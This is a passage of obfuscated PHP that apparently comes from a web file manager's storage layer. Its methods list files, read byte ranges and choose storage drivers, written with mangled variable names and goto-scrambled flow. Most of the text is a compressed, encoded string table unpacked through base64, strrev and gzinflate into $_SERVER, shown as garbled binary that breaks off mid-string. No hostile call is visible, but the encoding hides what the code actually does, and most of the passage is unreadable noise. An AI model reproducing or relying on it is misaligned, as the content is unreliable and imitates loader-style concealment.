$F·Ê¥ÉğÊ, $eôà¿Œ­[1035] => $DÒƒé®«÷); } $fÒèêˆİ = array($eôà¿Œ­[173] => $e”ÚÚ¬„«², $eôà¿Œ­[76] => $cØà‹¾âÑ³); goto C‡ºÙ’ÍÊ; c¶áè›Ú‘„: $EŸç‰‡±‘ = self::_listAll($FÚò›è¨“¶); $fó‰¥ÈÑÚ = self::_listAll($C…„‹‰„´); $e”ÚÚ¬„«² = array(); goto f”ºæ·—Ğ²; a¢‚Óìöêğ: } private static function _listAll($D„¶ºè­Ø) { $aÚÈç¥í¡ =& $_SERVER[òÀöí]; $D„¶ºè­Ø = KodIO::clear($D„¶ºè­Ø); $aœÓ³÷Ş£ = IO::listAll($D„¶ºè­Ø); foreach ($aœÓ³÷Ş£ as &$e¥†¬ßòñŒ) { $FŒ´‚¶ÉµÃ = substr($e¥†¬ßòñŒ[$aÚÈç¥í¡[75]], strlen($D„¶ºè­Ø)); $e¥†¬ßòñŒ[$aÚÈç¥í¡[1037]] = trim($FŒ´‚¶ÉµÃ, $aÚÈç¥í¡[8]); } unset($e¥†¬ßòñŒ); return array_to_keyvalue($aœÓ³÷Ş£, $aÚÈç¥í¡[1037]); } public static function fileSubstr($EÊöçĞëµ¾, $f‰ô…¬†ˆ×, $c¡¦ºÉ’ç = false) { goto CÜàÎ¯Îù©; CÀ”à·¡Õ: if (!$D®ğ‘ãÂÕÆ && $c¡¦ºÉ’ç && isset($GLOBALS[$C™Æß¢‡Úá[1040]])) { throw new Exception($GLOBALS[$C™Æß¢‡Úá[1040]][$C™Æß¢‡Úá[1041]]); } return $D®ğ‘ãÂÕÆ; goto AŒƒß¡ßŒ©; B½ÈœĞ“£ƒ: $f®ôˆö«Ó = $f‰ô…¬†ˆ×; $F¿»½æÁíá = $c¡¦ºÉ’ç; if ($f‰ô…¬†ˆ× < 0) { $f‰ô…¬†ˆ× = $DéŞÂ„È‘õ + $f‰ô…¬†ˆ×; } goto b‡àš¿ö‚÷; f¡ËÅçº¿è: if ($c¡¦ºÉ’ç <= 0) { return $C™Æß¢‡Úá[33]; } if ($f‰ô…¬†ˆ× < 0 || $f‰ô…¬†ˆ× >= $DéŞÂ„È‘õ || $c¡¦ºÉ’ç > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\122\145\141\144\40\x65\162\x72\x6f\x72\x21\40\x73\164\141\x72\x74\75{$f‰ô…¬†ˆ×}\73\154\145\x6e\147\x74\150\75{$c¡¦ºÉ’ç}\x3b\40\163\x69\172\x65\75{$DéŞÂ„È‘õ}\x3b"); } $D®ğ‘ãÂÕÆ = $e‚³´éº„Ø->fileSubstr($EÊöçĞëµ¾, $f‰ô…¬†ˆ×, $c¡¦ºÉ’ç); goto CÀ”à·¡Õ; b‡àš¿ö‚÷: if ($c¡¦ºÉ’ç === !1) { $c¡¦ºÉ’ç = $DéŞÂ„È‘õ - $f‰ô…¬†ˆ×; } if ($f‰ô…¬†ˆ× + $c¡¦ºÉ’ç > $DéŞÂ„È‘õ) { $c¡¦ºÉ’ç = $DéŞÂ„È‘õ - $f‰ô…¬†ˆ×; } if (!$DéŞÂ„È‘õ && $e‚³´éº„Ø->getType() == $C™Æß¢‡Úá[105] && !$e‚³´éº„Ø->exist($EÊöçĞëµ¾)) { throw new Exception($C™Æß¢‡Úá[1038] . LNG($C™Æß¢‡Úá[1039])); } goto f¡ËÅçº¿è; CÜàÎ¯Îù©: $C™Æß¢‡Úá =& $_SERVER[òÀöí]; $e‚³´éº„Ø = self::driverMake($EÊöçĞëµ¾); $DéŞÂ„È‘õ = $e‚³´éº„Ø->size($EÊöçĞëµ¾); goto B½ÈœĞ“£ƒ; AŒƒß¡ßŒ©: } private static function driverMake(&$fõ‚§¢¤õ) { goto cÇ¼É‹ˆËÅ; cÇ¼É‹ˆËÅ: $aÁ²­Õ¡­ =& $_SERVER[òÀöí]; $DÓŒ—™â˜î = KodIO::parse($fõ‚§¢¤õ); if (!self::$driverListSystem) { $câ‘ÍÖ‰§Ò = Model($aÁ²­Õ¡­[722])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($câ‘ÍÖ‰§Ò, $aÁ²­Õ¡­[385]); } goto A©ÜàœôÄ; A©ÜàœôÄ: if ($DÓŒ—™â˜î[$aÁ²­Õ¡­[29]] == KodIO::KOD_IO && !self::$driverListSystem[$DÓŒ—™â˜î[$aÁ²­Õ¡­[385]]]) { return !1; } $fõ‚§¢¤õ = $DÓŒ—™â˜î[$aÁ²­Õ¡­[1042]]; $D•¸¥µ¾¬‘ = self::driverGet($DÓŒ—™â˜î, $fõ‚§¢¤õ); goto FÄ‘Û´³•Ê; FÄ‘Û´³•Ê: return $D•¸¥µ¾¬‘; goto a‘µ°´å; a‘µ°´å: } private static function driverGet($f‚øò¹‘î«, &$d®µç§éã¬) { goto E¼ÂìÂ·ôâ; a´ß÷ŠĞâ´: switch ($f‚øò¹‘î«[$dÀòÖÃ‚´[29]]) { case KodIO::KOD_IO: $aÁÆã¯Ìš« = self::$driverListSystem[$e¥Ù·†„é“]; break; case KodIO::KOD_SOURCE: $d®µç§éã¬ = $e¥Ù·†„é“ . $d®µç§éã¬; $aÁÆã¯Ìš« = array($dÀòÖÃ‚´[1044] => $dÀòÖÃ‚´[1045], $dÀòÖÃ‚´[6] => $f‚øò¹‘î«); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $A’¡›Êç´ñ = $GLOBALS[$dÀòÖÃ‚´[1046]]; self::$driverListUser = array_to_keyvalue($A’¡›Êç´ñ, $dÀòÖÃ‚´[385]); } $aÁÆã¯Ìš« = self::$driverListUser[$e¥Ù·†„é“]; break; case KodIO::KOD_SHARE_LINK: $aÁÆã¯Ìš« = array($dÀòÖÃ‚´[1044] => $dÀòÖÃ‚´[1047], $dÀòÖÃ‚´[6] => $f‚øò¹‘î«); $EôÑÇõƒ¯Å = Action($dÀòÖÃ‚´[1048])->sharePathInfo($f‚øò¹‘î«[$dÀòÖÃ‚´[75]]); $d®µç§éã¬ = $EôÑÇõƒ¯Å[$dÀòÖÃ‚´[387]]; if (!$EôÑÇõƒ¯Å[$dÀòÖÃ‚´[387]]) { $E½²ÍÛåÕî = Model($dÀòÖÃ‚´[552])->getInfo($EôÑÇõƒ¯Å[$dÀòÖÃ‚´[457]]); $d®µç§éã¬ = KodIO::clear($E½²ÍÛåÕî[$dÀòÖÃ‚´[1049]] . $f‚øò¹‘î«[$dÀòÖÃ‚´[1042]]); $f‚øò¹‘î«[$dÀòÖÃ‚´[455]] = $E½²ÍÛåÕî; $f‚øò¹‘î«[$dÀòÖÃ‚´[1026]] = $d®µç§éã¬; $aÁÆã¯Ìš« = array($dÀòÖÃ‚´[1044] => $dÀòÖÃ‚´[1050], $dÀòÖÃ‚´[6] => $f‚øò¹‘î«); } break; case KodIO::KOD_SHARE_ITEM: $aÁÆã¯Ìš« = array($dÀòÖÃ‚´[1044] => $dÀòÖÃ‚´[1051], $dÀòÖÃ‚´[6] => $f‚øò¹‘î«); $E½²ÍÛåÕî = Model($dÀòÖÃ‚´[552])->getInfo($f‚øò¹‘î«[$dÀòÖÃ‚´[385]]); if ($E½²ÍÛåÕî[$dÀòÖÃ‚´[387]] == $dÀòÖÃ‚´[486]) { $d®µç§éã¬ = KodIO::clear($E½²ÍÛåÕî[$dÀòÖÃ‚´[1049]] . $f‚øò¹‘î«[$dÀòÖÃ‚´[1042]]); $f‚øò¹‘î«[$dÀòÖÃ‚´[455]] = $E½²ÍÛåÕî; $f‚øò¹‘î«[$dÀòÖÃ‚´[1026]] = $d®µç§éã¬; $aÁÆã¯Ìš« = array($dÀòÖÃ‚´[1044] => $dÀòÖÃ‚´[1052], $dÀòÖÃ‚´[6] => $f‚øò¹‘î«); } else { if (!$d®µç§éã¬) { $d®µç§éã¬ = $E½²ÍÛåÕî[$dÀòÖÃ‚´[387]]; } } break; default: $d®µç§éã¬ = $f‚øò¹‘î«[$dÀòÖÃ‚´[75]]; $aÁÆã¯Ìš« = array($dÀòÖÃ‚´[1044] => $dÀòÖÃ‚´[1053]); break; } $A”ÌÇ¡ÙŒ£ = $f‚øò¹‘î«[$dÀòÖÃ‚´[75]]; if (!isset(self::$driverCache[$A”ÌÇ¡ÙŒ£])) { $DÑ°ˆ÷ëÖ = strtolower($aÁÆã¯Ìš«[$dÀòÖÃ‚´[93]]); $CÅ¿–Ï‘ÌÕ = $GLOBALS[$dÀòÖÃ‚´[6]][$dÀòÖÃ‚´[87]][$dÀòÖÃ‚´[779]]; $eªÓŸÒƒˆœ = $dÀòÖÃ‚´[71] . (isset($CÅ¿–Ï‘ÌÕ[$DÑ°ˆ÷ëÖ]) ? $CÅ¿–Ï‘ÌÕ[$DÑ°ˆ÷ëÖ] : ucfirst($DÑ°ˆ÷ëÖ)); if (!class_exists($eªÓŸÒƒˆœ)) { show_json("{$eªÓŸÒƒˆœ}\x20\x6e\x6f\x74\40\145\170\x69\163\164\x73\x21", !1); } $b…í«ç®ù¨ = isset($aÁÆã¯Ìš«[$dÀòÖÃ‚´[6]]) ? $aÁÆã¯Ìš«[$dÀòÖÃ‚´[6]] : !1; self::$driverCache[$A”ÌÇ¡ÙŒ£] = new $eªÓŸÒƒˆœ($b…í«ç®ù¨); } goto F›’ É¿Ë•; E¼ÂìÂ·ôâ: $dÀòÖÃ‚´ =& $_SERVER[òÀöí]; $A—†ß…â¹Ã = $f‚øò¹‘î«[$dÀòÖÃ‚´[1043]]; $e¥Ù·†„é“ = $f‚øò¹‘î«[$dÀòÖÃ‚´[385]]; goto a´ß÷ŠĞâ´; F²²‡íØÊ: $Eš‰¬šªöí->path = $d®µç§éã¬; return $Eš‰¬šªöí; goto dÔšå”ŠÀ´; F›’ É¿Ë•: $Eš‰¬šªöí = self::$driverCache[$A”ÌÇ¡ÙŒ£]; $Eš‰¬šªöí->pathDriver = $A—†ß…â¹Ã; $Eš‰¬šªöí->pathBase = $dÀòÖÃ‚´[33]; goto còÔÜ·‰¤; còÔÜ·‰¤: if (isset($aÁÆã¯Ìš«[$dÀòÖÃ‚´[6]][$dÀòÖÃ‚´[1054]])) { $Eš‰¬šªöí->pathBase = rtrim($aÁÆã¯Ìš«[$dÀòÖÃ‚´[6]][$dÀòÖÃ‚´[1054]], $dÀòÖÃ‚´[8]) . $dÀòÖÃ‚´[8]; $d®µç§éã¬ = $Eš‰¬šªöí->pathBase . ltrim($d®µç§éã¬, $dÀòÖÃ‚´[8]); } $d®µç§éã¬ = $Eš‰¬šªöí->getPath($d®µç§éã¬); if (isset($f‚øò¹‘î«[$dÀòÖÃ‚´[1026]])) { $d®µç§éã¬ = $f‚øò¹‘î«[$dÀòÖÃ‚´[1026]]; } goto F²²‡íØÊ; dÔšå”ŠÀ´: } public static function errorTips($B¡ÎÅ‹¸£– = false) { goto bâë­Ù¦“ó; E·Àñì˜¯–: if ($B¡ÎÅ‹¸£– === -1) { return $e°Œ¡Üáˆ ? $e°Œ¡Üáˆ[count($e°Œ¡Üáˆ) - 1] : $C–Õ‰Ú›[33]; } if ($B¡ÎÅ‹¸£– === !1) { return implode($C–Õ‰Ú›[227], $e°Œ¡Üáˆ); } if (count($e°Œ¡Üáˆ) >= $BÛ‰ßŞÓÛ±) { $e°Œ¡Üáˆ = array_slice($e°Œ¡Üáˆ, $BÛ‰ßŞÓÛ± * 0.5, $BÛ‰ßŞÓÛ±); } goto eÂÎù®ĞĞÁ; bâë­Ù¦“ó: $C–Õ‰Ú› =& $_SERVER[òÀöí]; static $e°Œ¡Üáˆ = array(); $BÛ‰ßŞÓÛ± = 1000; goto E·Àñì˜¯–; eÂÎù®ĞĞÁ: $e°Œ¡Üáˆ[] = $B¡ÎÅ‹¸£–; write_log($C–Õ‰Ú›[159] . ACTION . $C–Õ‰Ú›[1055] . $B¡ÎÅ‹¸£–, $C–Õ‰Ú›[1056]); goto Eö£³ñÌÏ; Eö£³ñÌÏ: } public static function getLastError($dÁè”Ú”Èá = '') { $d’â«ÎÌ¸ = self::errorTips(-1); return $d’â«ÎÌ¸ ? $d’â«ÎÌ¸ : $dÁè”Ú”Èá; } } goto bÛ½ØñÁ‡Ö; B·„„è‰˜À: if (!function_exists('_kodDe')) { function _kodDe($Cåæ©×©­Ì) { $Cåæ©×©­Ì = base64_decode($Cåæ©×©­Ì); $bæÉ³á›±ª = strlen($Cåæ©×©­Ì); $BÛ©‘îÄà = ''; $F¿³»‰Ç = ord($Cåæ©×©­Ì[0]) - 30; for ($D‡¿Åò’“Ø = 1; $D‡¿Åò’“Ø < $bæÉ³á›±ª; $D‡¿Åò’“Ø += 2) { if ($D‡¿Åò’“Ø + 1 < $bæÉ³á›±ª) { $BÛ©‘îÄà .= chr(ord($Cåæ©×©­Ì[$D‡¿Åò’“Ø + 1]) + $F¿³»‰Ç); $BÛ©‘îÄà .= chr(ord($Cåæ©×©­Ì[$D‡¿Åò’“Ø]) + $F¿³»‰Ç); } else { $BÛ©‘îÄà .= chr(ord($Cåæ©×©­Ì[$D‡¿Åò’“Ø]) + $F¿³»‰Ç); } } return $BÛ©‘îÄà; } } define(strrev('íöÀò'), base64_decode('hN2lkA==')); $_SERVER[òÀöí] = explode(base64_decode('fAN8A3wG'), gzinflate(substr(strrev('\'$["VÙm‘Ç—+áÖ;c-'."\n".'…6r®>8ÕÅ|	}­'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\x31\xb6\xa3\xac\xa4\xb5\xb4\xb6\xa4\x95\x77\x57\xbe\xe2\x40\xcb\x99\x14\x52\xae\x90\x4\x42\x52\xae\x94\x70\x85\x2b\x81\x0\xe5\x6a\xb9\x4b\x4a\x29\x50\xce\x8f\x40\x21\x7\x94\xfb\x2a".strrev('ãŒİWíïø~=÷¥ÍÿY_§ÛŞó7¼Şo3ÜŞfˆCÿûÿïĞ¥vg¹ÿ(G')."\202\377\16\306\341\123\57\74\354\0\364\347\240\13\177\123\132\332\72\355\210\362\366\43\57\336\172\233\174\160\303\232\257\37\333\372\354\325\57\276\365\354\315\341\370\234".base64_decode('+69O/PIA34cnrKgFWXHJWvwjZTRTUkZUwzQwIKZl+tQEDqsZ/OvGP8ZgSjUVHA==')."\x8e\xb4\x7\xc2\x91\x50\x67\x47\x87\x37\x18\x8e\x90\x1a\xc5\xf4\xb4\x16\x27\xa1\xac\xac\xcb\x69\x52\x79\x56\xd1\xd\xd0\x94\x58\x5d\x24\xab\x65\x95\x8c\x5\xc2\x1\x71\xd9\x94\xa3\xb2".base64_decode('QWpqaog0eTv8ga5IuKvDS3JEI4M5RR/FMRQMmbJuhtW0wnIM66xfDd4WX7sUDg==')."\x7a\xda\x43\x9e\xc6\xb0\x2f\xd0\x8e\xc1\x8d\x81\xb6\x36\x5f\x38\x1f\x1e\xc\xf8\xfd\xd\x9e\xc6\xf9\xf9\x29\x1d\x41\x4f\x4b\x9b\x47\x2\xfd\x4b\x29\x11\x35\xd3\xa7\x95\x4a\x4b\x71\xca".base64_decode('UqkMB5pVJRXHwYxMu2OOZkkozEJgDTK5VApH2lmI9F/pk3MpMmdNYiSrq2mZDg==')."\175\276\62\312\240\70\40\347\114\115\315\304\160\304\73\142\352\62\207\203\36\307\164\45\255\144\110\125\41\257\337\333\30\226\140\67\245\346\140\240\115\42\113\221\226\15"."\123\321\245\105\255\336\240\127\202\135\257\53\101\43\56\221\160\271\316\166\60\41\222\307\357\227\366\127\203\251\244\263\264\32\134\246\100\145\201\140\223\67\50\65\164\111".strrev('÷‹Ô°MRzÀ·F,¼‡74	:\\~Á‚ˆ0oUĞ¦° \\e­:Zb|').base64_decode('pczIkJzKUWQdwL8l5If8agZB4EE1o+YIspIqNI3tHBLI0dwKhaRBMY3sKbDBhg==')."\160\260\156\16\376\235\105\62\105\43\60\115\321\315\210\222\211\151\161\65\103\266\141\75\331\162\4\361\144\63\331\244\253\40\37\251\120\163\305\264\354\150\233\66\104\306"."\320\247\246\24\77\333\145\175\132\52\256\350\74\236\5\305\305\24\62\30\165\114\50\335\236\113\213\131\130\64\226\124\123\161\235\156\316\37\313\11\266\277\332\67\312\67".base64_decode('oaHl9JjiA9uEl+1gPakkmRTTBIM26Lg6sylNjocUXRhrMygYyJkiMIeyNWt6ug==').base64_decode('CZAL0j7YJGpngYQBuk3iwhS68I+7tPvXzn/3ds8F/5QRmtdDupZUUqmIMqKQ7Q==').base64_decode('lI5PNehY3UZUzbgBBEd9gUhSNpJt8akRVIr0PBNXRlzZZBZH+XbvsaA7XJ12zQ==').strrev('é‚ĞkZ­kR]Iµ.)ML¢¬°šá´ˆÈBpâd¤6fšNR8”äÅ¥9'."\n".'ô').base64_decode('FAvR0TGYwYDmCMGYIhJXRkwyKdKsWFLWwXLV5cw+5wwMlLPZlBqTTVXLuLWYqQ==')."\230\116\303\324\25\231\324\346\211\305\24\303\160\66\152\31\123\327\122\116\117\52\245\15\73\3\272\232\120\63\265\322\24\234\7\46\202\155\356\204\204\261\226\354\335\242"."\131\22\304\25\110\27\246\340\326\350\236\144\271\165\71\143\364\51\272\323\113\66\115\255\4\326\203\321\105\232\255\111\65\262\232\241\302\356\325\112\262\151\312\261\44\244"."\x29\xbc\xfa\xba\x1f\xc9\xaf\x66\x52\x6a\x46\xc9\xcb\xeb\x1d\xc9\xaa\xba\x62\xd0\xbe\x4a\x2d\x6d\x61\x52\x9\xa8\x5d\x71\x76\xe8\x72\x22\x2d\xd7\x4a\xd9\x5c\x14\xcc\xc\xd9\xbd\x5\x60"."\70\67\231\232\132\51\6\243\16\51\235\63\114\247\256\0\342\244\202\143\220\254\261\257\317\331\6\267\226\252\304\235\41\100\303\11\270\272\242\106\2\150\43\321\64\14".strrev('h:+'."\r".'¡Ø¬`íXˆ1l±p)*³2€ıŸh\')¶é+cpm#{·Tpf¾";‡'."\r".'m').base64_decode('uGG0VhrQ4lFtxEWTYOYQoCE0M1zurOkMypkEnJ/oqKkQ9DOGEtaJ9iuZhJmkBQ==')."\103\336\340\102\157\60\22\12\64\207\27\171\202\344\220\317\0\54\31\241\115\301\252\123\316\240\22\7\123\37\63\151\71\71\13\147\215\346\201\33\3\256\25\115\205\233".base64_decode('hab5fS1wYpqcBsjkFHPRuv1qWoV9N1kKmknAAbSQDrnRgOp6klNKe+LlZU7w7w==')."\224\262\356\236\46\327\224\336\172\267\312\313\270\53\135\225\122\125\305\64\251\3\260\44\252\234\222\310\240\363\162\124\110\201\371\77\62\1\360\304\22\266\265\155\352\60".base64_decode('MOhd0OkNhSNt3nBroIm04PWQkF/DW5OOqBv/9JIV7MNk1ZeWEzYqDWNtmq5YIQ==')."\343\354\324\130\244\306\51\31\207\321\126\105\115\44\311\370\124\130\133\114\113\151\272\234\202\124\214\42\261\102\51\113\102\355\43\353\203\11\46\217\204\324\164\226\322\65"."\x33\x99\x4b\x47\x85\xa0\x9b\x77\x85\xb4\xb\x56\x9e\x1e\x34\x49\x8d\x1d\x74\x9a\x4e\x42\xb5\x6e\x52\xa4\xb8\xaa\x99\x6c\xa3\x80\x3b\x54\xd\xfe\x72\x82\x1c\xd7\xd2\x32\x65\x77\x11\x71".base64_decode('UuKYOmHQFEtKqyLzk9PUTQ1CdUuWNsVMamS5EgrtUo71jfYyrqQUOi9JhRJ3wA==')."\xc3\xd\xb1\xe9\x2\x8c\x1a\x8\xf3\xb3\x54\x35\x82\x20\x23\x64\x9c\x68\x7c\x11\xe4\x6f\x39\xc0\x64\x59\x53\xe0\x18\x9\x44\xfb\xc1\x3e\xc1\xf1\x88\x6a\x34\xb\xa7\x7e\x44\x43\x69\xa0"."\xaf\x32\xcf\xdf\xa1\x2b\x7d\x2a\xd9\x6d\x19\xb0\x54\x6d\xb2\x3e\x40\xb\x80\xa5\xe1\xe7\xd\x8c\x8\x95\x35\x77\xfa\xfd\x91\xc6\x40\x7b\x18\xf0\xcc\x18\xb2\x28\xe8\xb\x7b\x29\x72\x7a"."\x9a\x22\x9e\xc6\x8e\x71\x7a\x7a\xf2\xa5\x26\x19\x20\xa5\xb0\x62\x37\xe7\x8f\x87\xaa\xc6\xf9\x11\xc4\xcf\x2a\x4e\xc5\xc9\x44\x20\x2a\x8d\xc3\x80\x2c\x67\xb5\x8c\xa1\x38\x63\xa4\xb6\x38".strrev('Bw¦z!†İ9d}¡>?D«G­×Y94Á¦sœ§õ9Á+Ï1,Ç8ç§')."\xa4\x40\x3d\x84\x2\xb6\x29\xaa\xe8\xa4\x1f\x1d\x9d\x24\x29\x2d\xa0\x50\x8b\x97\x0\x8f\x20\x58\x97\x94\x9\xd3\xe4\x59\x14\xa2\x34\x37\x7\xf2\xeb\xea\x98\xcc\xc7\x58\x4f\xfb\x43\xea"."\36\111\247\70\47\150\35\225\223\257\105\270\325\327\76\77\322\26\150\362\372\43\276\166\100\220\302\371\360\316\216\46\17\135\134\21\336\20\10\267\132\240\235\200\44\55".base64_decode('9Ph99uzexb5QOFQwCcA6vbYUIPt1BL3NvsUs2uzz+ptCkUZPYyvP0+5pI5FIHw==').strrev('Å´ÇœÂ4`¥†G¸!Rs€8D'."\n".'*L±“¥PC"á“ÖĞ5·¾”').strrev('yzóçB%ö’	Àq ÃDQÑ RY™$\'’e?Å,ôÉ[dËI)¦ÆF').base64_decode('lD5GsgsDPH0mowK2ONgXPA2sgAeJ2wAT0IpE6F4zgKDiod3p46JuJNDhDXqgoA==')."\34\131\24\14\264\267\220\2\303\111\205\166\300\107\246\277\224\362\115\104\136\66\71\11\3\114\217\114\366\112\232\117\172\277\106\247\162\34\377\234\216\177\0\277\107\32"."\127\62\164\326\243\220\170\63\302\100\205\41\260\33\50\341\325\162\254\265\250\246\221\26\122\360\350\37\247\364\200\111\332\375\6\105\222\21\112\174\312\111\203\43\344\0".base64_decode('CQfme9sjFLNwTMBGDACyayBIJsTUBqgkhROD3hDd5boymFPpdLld5QSLFXBGkQ==')."\xe6\xdd\x4b\x7a\x86\xcb\x4b\xbb\x9d\xe5\xae\x5e\x10\x28\x9b\x32\x17\x47\x49\xac\xc7\x65\x89\x9e\x46\xca\xe7\x74\x56\x1a\x72\x44\xa5\x46\x7d\x59\x6d\x8f\xbb\xc7\x5d\x5a\x5f\xdb\xed\x71"."\216\311\316\261\12\347\114\147\157\171\217\253\254\234\0\172\227\125\71\152\226\303\14\40\143\375\344\136\360\123\327\123\137\334\343\74\375\314\245\163\273\173\172\113\152\313".base64_decode('J/W4JvcM904pq6ftxHI6kBJjo6yr8fJS0CXAKbEsGUTyhAw0YUzNcuiyacspHA==')."\254\241\222\340\45\272\235\75\345\275\365\102\71\1\144\157\13\160\111\200\376\46\131\76\217\363\14\70\62\126\24\356\173\202\37\271\114\214\123\117\270\57\242\162\214\320".base64_decode('ATWRYVsIHPpMOrcy6MuK8e9yupAJhWx6dLGmE+zMZdRBeueQUQZJQDMpfkcVcw==')."\x58\xa1\xe8\x1\xe0\x96\x38\x40\xe\x2a\x11\x82\x24\x21\x96\x42\xfc\x20\x69\x81\x4b\x66\xa\x12\x53\xc8\x28\xb2\x11\xc8\x8c\xd\xb3\x58\x5c\xc9\x90\x75\x3a\x9c\xe4\x36\x62\x72\x56\x9"."\x9\x23\x8c\x44\xc2\x9e\x6\xbf\x37\x42\x29\xc\xa1\xc4\x34\x8e\xa8\x62\x3\xbb\xa5\x3\x43\xe3\x14\x95\xd2\x87\x18\xe7\xce\x91\x20\x42\x76\xbe\x31\x98\x92\x10\x61\x90\x14\x5d\xd7\xf4"."\x5a\x74\x1b\x69\xe4\xb2\x90\x77\x3\x42\x97\x9\xe6\x56\x2\x12\xbb\x54\x37\x47\xc2\x53\x4e\xca\x45\xc4\x5\xc8\xca\x94\x73\x80\x42\x34\xe3\x6\xdc\xa5\x3d\x3d\xb9\x6e\x25\xde\xdb\xd".base64_decode('kFp29vUuq15eRplzdw/4QyOYlpHeZ/laGoA3o5yTp8ClWYRRQ9gFdveh6Ywnyg==')."\x5a\xd8\x69\x53\x33\xe5\x14\xcb\x6\xd3\xc2\x10\x42\xd6\x8e\x9d\xcb\xe4\x2a\x0\x2f\xa6\x9f\x13\x24\x78\x52\xb\x57\x8a\x88\x5a\xb6\xb3\xfb\x32\x76\xb1\x21\xdc\x66\x1\x98\x43\x88\xe2".base64_decode('f+uIPN+nZsCmaBQOLHz9Eho1TCVtuWg0FFmPJZtzqZTJePeUOkCqJRi/tFDeZg==')."\115\217\131\326\235\237\170\55\36\300\133\204\245\322\22\302\133\117\51\221\174\355\122\103\40\340\367\172\332\45\170\274\222\143\301\327\344\244\65\54\166\372\210\74\303\2".base64_decode('KmWZZUByTAol9000j4VRNWUdnKucu4R8oHAXC2bUAa9hHPDcd4AxOKBc4+BcuA==')."\x83\x5f\x6e\x39\x18\xf\xec\x20\xac\xb1\x83\xd7\x4e\x82\xbe\x26\x87\x6a\x34\x21\x36\x1f\xd5\x8b\x92\x68\x9f\xcd\x24\xbc\x67\x48\xc9\xa3\xe\xdc\x7f\xbf\x32\xa4\xa4\x1c\xb4\xf7\xe\x3a".strrev('!%´²å®„ƒ‚‚`iĞss¿9Ä	¢¤²PoIo'."\0".'7¤M`	(')."\206\73\103\0\274\247\14\20\324\64\323\101\45\102\107\276\260\10\273\303\103\13\71\42\362\336\217\323\43\236\14\1\307\355\175\300\120\230\336\54\17\211\13\134\160\261".base64_decode('M1bE4FfK/OqTs3R24cp+cQkbDcuJkNCcKSdoWwVScTioxEZjXEBrEqQ8a4wtNQ==')."\302\273\102\310\123\170\251\31\102\60\334\72\342\360\303\51\46\123\54\141\350\143\101\256\375\142\63\37\123\40\313\117\101\110\230\102\200\36\13\244\207\202\2\234\322\345"."\310\251\55\33\61\34\200\267\221\44\244\120\230\320\177\72\172\113\275\60\312\167\42\35\242\4\53\40\5\320\71\2\261\314\311\227\124\210\222\37\125\213\340\171\215\244"."\231\150\313\46\332\106\24\341\274\167\250\231\121\65\43\336\71\160\350\70\243\275\234\220\103\164\266\335\222\64\355\57\214\151\11\277\323\160\220\273\16\7\220\125\7\4"."\352\313\345\152\320\173\130\124\350\73\251\311\326\163\272\341\310\240\73\201\240\26\261\41\46\101\311\244\254\363\71\245\73\10\242\61\277\311\201\131\170\124\310\326\47\17"."\xf1\x43\xc6\x52\x46\xd8\x7\x86\x39\xca\x2e\x63\x84\xa0\xb5\x52\x1c\x6d\xda\x5f\xa4\x95\xc9\x9f\x85\xa2\xe2\x16\x53\xd\x3f\x98\xbb\x42\x61\x34\xd2\xb0\x56\x30\xa\x6f\x45\x68\x58\x43"."\370\155\214\163\206\105\2\254\12\275\54\244\222\107\304\166\303\1\242\302\202\105\54\227\41\270\177\36\106\361\0\317\225\2\204\120\167\301\275\322\2\351\31\235\64\274"."\xad\x69\x17\x21\xd\xc5\x61\x21\x53\xd6\x4e\xfa\x2c\x24\x5a\xcc\x43\x63\x76\x22\x6d\x83\xda\xa2\xbc\x51\xb\xf9\xe1\x5b\xca\x52\xb\xbd\x3d\xab\x20\xc8\x1f\x7\x2\xad\x4b\xc7\x4\xce".strrev('ûÕÀçµè9Bğ€“òñƒ¥İeEy Lvm¹q Ÿˆ—‹¾5N¨æò!¸')."\x35\xca\xa6\xc3\x5d\xe1\x8d\xab\x26\x84\x40\xa2\xa6\xd1\x3b\x37\x9e\x51\x78\x96\x62\x30\xa1\x42\x34\x25\xae\xbc\x35\xe0\xc\x8f\xa3\xd8\x92\xb3\x10\x41\x77\x4d\x41\x34\xd8\xc5\x8f\x1c"."\xf1\xc0\x12\x5f\xde\xe0\xdb\x1d\xe\x9\xaf\xd4\x69\xf6\x98\x87\x80\x2e\xc3\xd4\xb2\x3c\x45\x88\xe2\x64\x21\x89\x57\x2a\xe4\x62\xd3\x8d\xfa\x4\x48\x7f\x1c\x31\x2\x7c\xd2\x50\x5e\x52"."\26\261\363\30\235\135\51\220\103\270\41\366\65\171\164\235\242\5\36\20\274\73\4\100\21\4\167\156\210\136\171\26\42\305\270\162\357\20\177\175\306\125\301\206\135\370"."\144\162\311\361\170\200\336\345\211\341\374\254\342\325\106\341\212\220\102\0\253\112\210\25\316\356\111\245\370\173\241\75\276\337\42\170\167\212\205\104\310\176\213\65\43\56"."\234\136\354\27\202\61\346\115\44\105\126\236\225\277\336\332\171\133\53\271\371\117\174\127\36\316\363\5\55\34\207\24\61\251\146\24\203\35\111\272\121\140\304\20\63\367"."\267\114\60\115\270\174\2\362\25\0\210\324\236\335\260\160\42\40\34\150\350\160\210\230\226\243\70\210\352\20\120\325\62\373\140\153\340\231\154\326\265\264\57\0\120\277"."\60\76\330\363\51\364\216\11\121\230\21\265\320\100\301\372\301\43\141\177\165\322\144\126\25\77\77\376\365\305\236\77\177\374\362\203\70\362\305\332\167\277\336\372\12\16".strrev(';ÏVW¿æÿ\'-:ÒÜv“Í­ç»O·Îüù3?\'äínâŞsö®8dCò¤Á®­O')."\xad\x78\xe7\xcf\xdd\x7d\xc3\x7d\xf7\x95\x7f\xf4\x91\xe3\x5f\x45\x97\xdd\x1c\xb9\xe8\x9e\x95\x9f\x5f\x52\xe4\xed\xbd\xc6\x75\xc6\xd6\xe6\x9f\x6c\x9d\x7b\xf2\xac\xb9\xe7\x1c\xdc\xf6\xd7".strrev('ãg­÷\\×ßöşÍÖëåäÿÖ{™Î×